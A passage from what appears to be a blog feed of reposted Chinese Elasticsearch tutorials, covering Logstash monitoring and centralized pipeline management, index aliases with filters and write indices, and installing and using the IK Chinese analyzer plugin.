&quot;/Users/liuxg/data/multi-pipeline/apache_template.json&quot; template_name =&gt; &quot;apache_elastic_example&quot; template_overwrite =&gt; true &#125; &#125;同时，我们需要添加hosts, user及password的定义。这是因为我们现在我们是需要有用户名及密码才可以连接到Elasticsearch。这个和之前的练习是不一样的。同时我们可以创建自己的用户名及密码。我们可以参考“Elasticsearch：用户安全设置”来创建自己喜欢的账号。在这里，为了方便，我们使用elastic账号。在这里，我们是用${ES_HOST}及${ES_PWD}来代表我们的Elasticsearch地址及密码。这样的好处是我们不暴露我们的密码在配置文件中。一旦上面的配置已经做好了，我们可以使用如下的命令来把我们的apache log文件上传到Elasticsearch之中：1sudo ./bin/logstash -f ~/data/multi-pipeline/apache.confStep3：打开Stack Monitoring UI我们安装如下的步骤来查看Logstash的monitoring：我们会发现在Logstash运行的情况下，有一个Logstash的类别出现了。这在之前是没有的。我们点击Nodes 1：我们看到一个Logstash的运行实例。它显示了目前CPU的使用情况和Load Average及JVM head的使用情况。点击上面的超链接：我们可以看到更加详细的使用情况。我们也可以查看pipeline的状况：Logstash集中管理首先我们来创建一个叫做logstash_writer的role:点击“Create role”来创建我们的role。首先让我们来创建一个具有logstash_user的用户账号：点击上面的“Create user”按钮来创建一个用户：点击“Create user”来创建一个叫做logstash_user的账号。它具有logstash_admin及logstash_system的权限。为了启动集中管理，我们必须在logstash.yml文件里做相应的配置：12345xpack.management.enabled: truexpack.management.pipeline.id: [&quot;main&quot;, &quot;apache_logs&quot;, &quot;my_apache_logs&quot;]xpack.management.elasticsearch.username: &quot;logstash_user&quot;xpack.management.elasticsearch.password: &quot;123456&quot;xpack.management.elasticsearch.hosts: [&quot;$&#123;ES_HOST&#125;&quot;]我们可以在链接https://www.elastic.co/guide/en/logstash/current/logstash-centralized-pipeline-management.html找到更多的描述。在这里，我们启动logstash的管理，同时也把我们刚才创建的logstash_user的账号填入进来，并同时取了一个叫做my_apache_logs的pipeline id。一旦启动了logstash的集中管理，我们就可以直接启动logstash，而不用跟任何的参数：1sudo ./bin/logstash这样我们的logstash已经被成功运行起来了。我们接下来可以在Kibana中创建自己的pipeline。点击上面的“Create pipeline”按钮，我们可以看到如下的画面：接下来我们点击“Create and Deploy”按钮：这样我们的my_apache_logs就被创建好了，而且已经被成功执行了。我们可以在Kibana中创建一个叫apache_log的index pattern，然后打开Discover，你可以看到刚刚被Logstash导入的数据：好了到此，我们关于如何启动Logstash的监控及集中管理讲完了。————————————————版权声明：本文为CSDN博主「Elastic 中国社区官方博客」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/UbuntuTouch/article/details/103767088]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lasticsearch：Index alias]]></title>
    <url>%2F2020%2F01%2F02%2Flasticsearch%EF%BC%9AIndex%20alias%2F</url>
    <content type="text"><![CDATA[现在让我们来谈谈Elasticsearch最简单和最有用的功能之一：别名 （alias)。为了区分这里alias和文章“Elasticsearch : alias数据类型”，这里的别名（alias）指的是index的别名。 别名正是他们听起来的样子; 它们是您可以使用的指针或名称，对应于一个或多个具体索引。 事实证明这非常有用，因为它在扩展集群和管理数据在索引中的布局方式时提供了灵活性。 即使使用Elasticsearch 只有一个索引的集群，使用别名。 您将在以后感谢我们给予您的灵活性。别名到底是什么？您可能想知道别名究竟是什么，以及Elasticsearch在创建别名时涉及何种开销。 别名将其生命置于群集状态内，由主节点（master node)管理; 这意味着如果你有一个名为idaho的别名指向一个名为potato的索引，那么开销就是群集状态映射中的一个额外键，它将名称idaho映射到具体的索引字符串。 这意味着与其他指数相比，别名的重量要轻得多; 可以维护数千个而不会对集群产生负面影响。 也就是说，我们会警告不要创建数十万或数百万个别名，因为在这一点上，即使映射中单个条目的最小开销也会导致集群状态增长到大小。 这意味着创建新群集状态的操作将花费更长时间，因为每次更改时都会将整个群集状态发送到每个节点。为什么别名是有用的？我们建议每个人都为他们的Elasticsearch索引使用别名，因为在重新索引时，它将在未来提供更大的灵活性。 假设您首先创建一个包含单个主分片的索引，然后再决定是否需要更多索引容量。 如果您使用原始别名index，您现在可以将该别名更改为指向另外创建的索引，而无需更改您正在搜索的索引的名称（假设您从头开始使用别名进行搜索）。 另一个有用的功能是可以创建不同索引的窗口; 例如，如果您为数据创建每日索引，则可能需要创建一个名为last-7-days的别名的上周数据的滑动窗口; 然后每天创建新的每日索引时，可以将其添加到别名中，同时删除8天的索引。另外的一种场景是，当我们修改了我们的index的mapping，让后通过reindex API来把我们的现有的index转移到新的index上，那么如果在我们的应用中，我们利用alias就可以很方便地做这间事。在我们成功转移到新的index之后，我们只需要重新定义我们的alias指向新的index，而在我们的客户端代码中，我们一直使用alias来访问我们的index，这样我们的代码不需要任何的改动。建立index为了验证我们的API，我们先建立一些数据：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125; PUT twitter/_doc/2&#123; &quot;user&quot; : &quot;东城区-老刘&quot;, &quot;message&quot; : &quot;出发，下一站云南！&quot;, &quot;uid&quot; : 3, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区台基厂三条3号&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.904313&quot;, &quot;lon&quot; : &quot;116.412754&quot; &#125;&#125; PUT twitter/_doc/3&#123; &quot;user&quot; : &quot;虹桥-老吴&quot;, &quot;message&quot; : &quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;, &quot;uid&quot; : 7, &quot;age&quot; : 90, &quot;city&quot; : &quot;上海&quot;, &quot;province&quot; : &quot;上海&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国上海市闵行区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;31.175927&quot;, &quot;lon&quot; : &quot;121.383328&quot; &#125;&#125;这样，我们建立了三个文档的twitter索引。管理别名添加一个index alias一个index别名就是一个用来引用一个或多个已经存在的索引的另外一个名字，我们可以用如下的方法来创建1PUT /twitter/_alias/alias1请求的格式：1234PUT /&lt;index&gt;/_alias/&lt;alias&gt;POST /&lt;index&gt;/_alias/&lt;alias&gt;PUT /&lt;index&gt;/_aliases/&lt;alias&gt;POST /&lt;index&gt;/_aliases/&lt;alias&gt;路径参数：123&lt;index&gt;:要添加到别名的索引名称的逗号分隔列表或通配符表达式。 要将群集中的所有索引添加到别名，请使用_all值。&lt;alias&gt;:(必需,字符串)要创建或更新的索引别名的名称。比如经过上面的REST 请求，我们为twitter创建了另外一个别名alias1。我们以后可以通过alias1来访问这个index:1GET alias1/_search显示的结果：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 3, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老贾&quot;, &quot;message&quot; : &quot;123,gogogo&quot;, &quot;uid&quot; : 5, &quot;age&quot; : 35, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区建国门&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.718256&quot;, &quot;lon&quot; : &quot;116.367910&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;5&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老王&quot;, &quot;message&quot; : &quot;Happy BirthDay My Friend!&quot;, &quot;uid&quot; : 6, &quot;age&quot; : 50, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区国贸&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.918256&quot;, &quot;lon&quot; : &quot;116.467910&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;虹桥-老吴&quot;, &quot;message&quot; : &quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;, &quot;uid&quot; : 7, &quot;age&quot; : 90, &quot;city&quot; : &quot;上海&quot;, &quot;province&quot; : &quot;上海&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国上海市闵行区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;31.175927&quot;, &quot;lon&quot; : &quot;121.383328&quot; &#125; &#125; &#125;, ...显然这样做的好处是非常明显的，我们可以把我们想要的进行搜索的index取一个和我们搜索方法里一样的别名就可以了，这样我们可以不修改我们的搜索方法，就可以分别对不同的index进行搜索。比如我们可以用同样的搜索方法对每天的log进行分析。只有把每天的log的index的名字都改成一样的alias就可以了。创建一个基于城市的alias：12345678PUT twitter/_alias/city_beijing&#123; &quot;filter&quot;: &#123; &quot;term&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125;&#125;在这里，我们创建了一个名称为city_beijing的alias。如果我们运行如下的搜索：1GET city_beijing/_search它将返回所有关于城市为北京的搜索结果：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 4, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老贾&quot;, &quot;message&quot; : &quot;123,gogogo&quot;, &quot;uid&quot; : 5, &quot;age&quot; : 35, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区建国门&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.718256&quot;, &quot;lon&quot; : &quot;116.367910&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;5&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;朝阳区-老王&quot;, &quot;message&quot; : &quot;Happy BirthDay My Friend!&quot;, &quot;uid&quot; : 6, &quot;age&quot; : 50, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市朝阳区国贸&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.918256&quot;, &quot;lon&quot; : &quot;116.467910&quot; &#125;...alias也可以在创建index时被创建，比如：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778DELETE twitter PUT twitter&#123; &quot;mappings&quot; : &#123; &quot;properties&quot; : &#123; &quot;address&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;age&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125;, &quot;city&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;copy_to&quot; : [ &quot;region&quot; ] &#125;, &quot;country&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;copy_to&quot; : [ &quot;region&quot; ] &#125;, &quot;explain&quot; : &#123; &quot;type&quot; : &quot;boolean&quot; &#125;, &quot;location&quot; : &#123; &quot;type&quot; : &quot;geo_point&quot; &#125;, &quot;message&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125;, &quot;province&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;copy_to&quot; : [ &quot;region&quot; ] &#125;, &quot;region&quot; : &#123; &quot;type&quot; : &quot;text&quot; &#125;, &quot;uid&quot; : &#123; &quot;type&quot; : &quot;long&quot; &#125;, &quot;user&quot; : &#123; &quot;type&quot; : &quot;text&quot;, &quot;fields&quot; : &#123; &quot;keyword&quot; : &#123; &quot;type&quot; : &quot;keyword&quot;, &quot;ignore_above&quot; : 256 &#125; &#125; &#125; &#125; &#125;, &quot;aliases&quot;: &#123; &quot;city_beijing&quot;: &#123; &quot;filter&quot;: &#123; &quot;term&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125; &#125; &#125;&#125;在这里，我们删除了twitter索引，同时我们重新定义twitter索引的mapping，并同时定义了city_beijing你别名。重新index我们上面的三个文档，那么我们再次搜索我们的数据：1GET city_beijing/_search我们可以看到两个城市为北京的搜索结果：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 2, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-老刘&quot;, &quot;message&quot; : &quot;出发，下一站云南！&quot;, &quot;uid&quot; : 3, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区台基厂三条3号&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.904313&quot;, &quot;lon&quot; : &quot;116.412754&quot; &#125; &#125; &#125; ] &#125;&#125;获取alias我们可以通过如下的API来获取当前以及定义好的alias:123GET /_aliasGET /_alias/&lt;alias&gt;GET /&lt;index&gt;/_alias/&lt;alias&gt;比如：1GET /twitter/_alias/alias1这里获取在twitter下的名字叫做alias1的别名。针对我们的情况，我们使用如下的接口：1GET /twitter/_alias/city_beijing我们获取我们之前得到的city_beijing的alias。显示的结果如下：12345678910111213&#123; &quot;twitter&quot; : &#123; &quot;aliases&quot; : &#123; &quot;city_beijing&quot; : &#123; &quot;filter&quot; : &#123; &quot;term&quot; : &#123; &quot;city&quot; : &quot;北京&quot; &#125; &#125; &#125; &#125; &#125;&#125;你也可以通过如下的wild card方式来获取所有的alias:1GET /twitter/_alias/*比如，我们新增加一个alias1的别名：1PUT /twitter/_alias/alias1上面的wild card方式返回来得结果为：1234567891011121314&#123; &quot;twitter&quot; : &#123; &quot;aliases&quot; : &#123; &quot;alias1&quot; : &#123; &#125;, &quot;city_beijing&quot; : &#123; &quot;filter&quot; : &#123; &quot;term&quot; : &#123; &quot;city&quot; : &quot;北京&quot; &#125; &#125; &#125; &#125; &#125;&#125;显然这里有两个别名：alias1及city_beijing。你可以通过如下的方式来搜寻你的alias:1GET /_alias/city_*它将显示名字以city开始的所有的alias。检查一个alias是否存在我们可以通过如下的方式来检查一个alias是否存在：12HEAD /_alias/&lt;alias&gt;HEAD /&lt;index&gt;/_alias/&lt;alias&gt;比如：1HEAD /_alias/alias1它显示的结果是：1200 - OK同样你也可通过wild card方式来查询：1HEAD /_alias/city*这个用来检查所有以city为开头的alias。更新alias我们这里所说的更新包括：添加及删除接口为：1POST /_aliases比如：123456POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;twitter&quot;, &quot;alias&quot; : &quot;alias2&quot; &#125; &#125; ]&#125;在这里，我们为twitter索引添加了一个叫做alias2的别名。运行后，我们可以通过alias2来重新搜索我们的twitter1GET /alias2/_search我们可以看到我们想要的结果：1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 3, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125;, ...在action里，我们可以有如下的几种：123add: 添加一个别名remove: 删除一个别名remove_index: 删除一个index或它的别名比如我们可以通过如下的方法来删除一个alias123456POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;remove&quot;: &#123; &quot;index&quot; : &quot;twitter&quot;, &quot;alias&quot; : &quot;alias2&quot; &#125; &#125; ]&#125;一旦删除后，之前的定义的alias2就不可以用了。重新命名一个alias重命名别名是一个简单的删除然后在同一API中添加操作。 此操作是原子操作，无需担心别名未指向索引的短时间段：1234567POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;remove&quot; : &#123; &quot;index&quot; : &quot;twitter&quot;, &quot;alias&quot; : &quot;alias1&quot; &#125; &#125;, &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;twitter&quot;, &quot;alias&quot; : &quot;alias2&quot; &#125; &#125; ]&#125;上面的操作，删除alias1，同时创建一个新的叫做alias2的别名。我们也可以把同一个alias在指向不同时期的index，比如我们的log index滚动下一个月，我们可以修改我们的alias总是指向最新的index。为多个索引添加同样一个alias将别名与多个索引相关联只需几个添加操作：1234567POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test1&quot;, &quot;alias&quot; : &quot;alias1&quot; &#125; &#125;, &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test2&quot;, &quot;alias&quot; : &quot;alias1&quot; &#125; &#125; ]&#125;你也可以通过如下的方式，通过一个add命令来完成：123456POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;indices&quot; : [&quot;test1&quot;, &quot;test2&quot;], &quot;alias&quot; : &quot;alias1&quot; &#125; &#125; ]&#125;甚至：123456POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test*&quot;, &quot;alias&quot; : &quot;all_test_indices&quot; &#125; &#125; ]&#125;这样所有以test*为开头的索引都共同一个别名。当我们index我们的文档时，对一个指向多个index的别名进行索引是错误的。也可以在一个操作中使用别名交换索引：123456789PUT test PUT test_2 POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot;: &#123; &quot;index&quot;: &quot;test_2&quot;, &quot;alias&quot;: &quot;test&quot; &#125; &#125;, &#123; &quot;remove_index&quot;: &#123; &quot;index&quot;: &quot;test&quot; &#125; &#125; ]&#125;在上面的例子中，假如我们地添加了一个叫做test的index，而test_2是我们想要的。我们直接可以通过上面的方法吧test中的数据交换到test_2中，并同时把test索引删除。Filtered alias带有过滤器的别名提供了一种创建同一索引的不同“视图”的简便方法。 可以使用Query DSL定义过滤器，并使用此别名将其应用于所有“搜索”，“计数”，“按查询删除”和“更多此类操作”。要创建过滤后的别名，首先我们需要确保映射中已存在这些字段：12345678910PUT /test1&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;user&quot; : &#123; &quot;type&quot;: &quot;keyword&quot; &#125; &#125; &#125;&#125;现在我们可以利用filter来创建一个alias，是基于user字段123456789101112POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test1&quot;, &quot;alias&quot; : &quot;alias2&quot;, &quot;filter&quot; : &#123; &quot;term&quot; : &#123; &quot;user&quot; : &quot;kimchy&quot; &#125; &#125; &#125; &#125; ]&#125;Write index可以将别名指向的索引关联为write索引。 指定后，针对指向多个索引的别名的所有索引和更新请求将尝试解析为write索引的一个索引。 每个别名只能将一个索引分配为一次write索引。 如果未指定write索引且别名引用了多个索引，则不允许写入。可以使用别名API和索引创建API将与别名关联的索引指定为write索引。123456789101112131415161718POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test&quot;, &quot;alias&quot; : &quot;alias1&quot;, &quot;is_write_index&quot; : true &#125; &#125;, &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test2&quot;, &quot;alias&quot; : &quot;alias1&quot; &#125; &#125; ]&#125;在这里，我们定义了alias1同时指向test及test2两个索引。其中test中，注明了is_write_index，那么，如下的操作：1234PUT /alias1/_doc/1&#123; &quot;foo&quot;: &quot;bar&quot;&#125;相当于如下的操作：1PUT /test/_doc/1也就是写入到test索引中，而不会写入到test2中。要交换哪个索引是别名的写入索引，可以利用别名API进行原子交换。 交换不依赖于操作的顺序。123456789101112131415161718POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test&quot;, &quot;alias&quot; : &quot;alias1&quot;, &quot;is_write_index&quot; : false &#125; &#125;, &#123; &quot;add&quot; : &#123; &quot;index&quot; : &quot;test2&quot;, &quot;alias&quot; : &quot;alias1&quot;, &quot;is_write_index&quot; : true &#125; &#125; ]&#125;参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.3/indices-aliases.html【2】https://www.elastic.co/guide/en/elasticsearch/reference/7.3/indices-get-alias.html【3】https://www.elastic.co/guide/en/elasticsearch/reference/7.3/indices-add-alias.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lasticsearch：IK中文分词器]]></title>
    <url>%2F2020%2F01%2F02%2Flasticsearch%EF%BC%9AIK%E4%B8%AD%E6%96%87%E5%88%86%E8%AF%8D%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Elasticsearch内置的分词器对中文不友好，只会一个字一个字的分，无法形成词语，比如：12345POST /_analyze&#123; &quot;text&quot;: &quot;我爱北京天安门&quot;, &quot;analyzer&quot;: &quot;standard&quot;&#125;如果我们使用的是standard的分词器，那么结果就是：1234567891011121314151617181920212223242526&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;我&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 1, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;爱&quot;, &quot;start_offset&quot; : 1, &quot;end_offset&quot; : 2, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 1 &#125;, ... &#123; &quot;token&quot; : &quot;门&quot;, &quot;start_offset&quot; : 6, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;&lt;IDEOGRAPHIC&gt;&quot;, &quot;position&quot; : 6 &#125; ]&#125;显然这对中文来说并不友好，它显示的每一个汉字。好在Elastic的大拿medcl已经为我们做好IK中文分词器。下面我们来详细介绍如何安装并使用中文分词器。具体的安装步骤可以在地址https://github.com/medcl/elasticsearch-analysis-ik找到。安装首先，我们可以到如下的地址查看一下是否有最新的版本对应你的Elasticsearch的发行版：https://github.com/medcl/elasticsearch-analysis-ik/releases到目前截止日期，我们可以看到有最新的v7.3.1发行版。那么，我们直接进入到我们的Elasticsearch的安装目录下，并打入如下的命令：1./bin/elasticsearch-plugin nstall https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v7.3.1/elasticsearch-analysis-ik-7.3.1.zip替代上面的7.3.1安装你自己想要的版本：安装好后，我们可以通过如下的命令来检查是否已经安装好：12localhost:elasticsearch-7.3.0 liuxg$ ./bin/elasticsearch-plugin listanalysis-ik上面的命令显示我们的IK已经安装成功了。这个时候需要我们重新启动一下我们的Elasticsearch，以便这个plugin能装被加载。使用IK分词器首先我们创建一个index:1PUT chinese接下来，我们来为这个index 创建一个mapping12345678910PUT /chinese/_mapping&#123; &quot;properties&quot;: &#123; &quot;content&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;analyzer&quot;: &quot;ik_max_word&quot;, &quot;search_analyzer&quot;: &quot;ik_smart&quot; &#125; &#125;&#125;运行上面的命令后，如果出现如下的信息：123&#123; &quot;acknowledged&quot; : true&#125;它表明我们的安装时成功的。接下来，我们来index一些文档：12345GET /chinese/_analyze&#123; &quot;text&quot;: &quot;我爱北京天安门&quot;, &quot;analyzer&quot;: &quot;ik_max_word&quot;&#125;显示的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&#123; &quot;tokens&quot; : [ &#123; &quot;token&quot; : &quot;我&quot;, &quot;start_offset&quot; : 0, &quot;end_offset&quot; : 1, &quot;type&quot; : &quot;CN_CHAR&quot;, &quot;position&quot; : 0 &#125;, &#123; &quot;token&quot; : &quot;爱&quot;, &quot;start_offset&quot; : 1, &quot;end_offset&quot; : 2, &quot;type&quot; : &quot;CN_CHAR&quot;, &quot;position&quot; : 1 &#125;, &#123; &quot;token&quot; : &quot;北京&quot;, &quot;start_offset&quot; : 2, &quot;end_offset&quot; : 4, &quot;type&quot; : &quot;CN_WORD&quot;, &quot;position&quot; : 2 &#125;, &#123; &quot;token&quot; : &quot;天安门&quot;, &quot;start_offset&quot; : 4, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;CN_WORD&quot;, &quot;position&quot; : 3 &#125;, &#123; &quot;token&quot; : &quot;天安&quot;, &quot;start_offset&quot; : 4, &quot;end_offset&quot; : 6, &quot;type&quot; : &quot;CN_WORD&quot;, &quot;position&quot; : 4 &#125;, &#123; &quot;token&quot; : &quot;门&quot;, &quot;start_offset&quot; : 6, &quot;end_offset&quot; : 7, &quot;type&quot; : &quot;CN_CHAR&quot;, &quot;position&quot; : 5 &#125; ]&#125;从上面的结果我们可以看出来，在我们的token中显示“北京”，“天安”及“天安门”。这个和我们之前的是不一样的。下面，我们输入两个文档：123456789PUT /chinese/_doc/1&#123; &quot;content&quot;:&quot;我爱北京天安门&quot;&#125; PUT /chinese/_doc/2&#123; &quot;content&quot;: &quot;北京，你好&quot;&#125;那么我们可以，通过如下的方式来进行搜索：12345678GET /chinese/_search&#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;北京&quot; &#125; &#125;&#125;我们显示的结果是：12345678910111213141516171819202122232425262728293031323334353637&#123; &quot;took&quot; : 1, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; 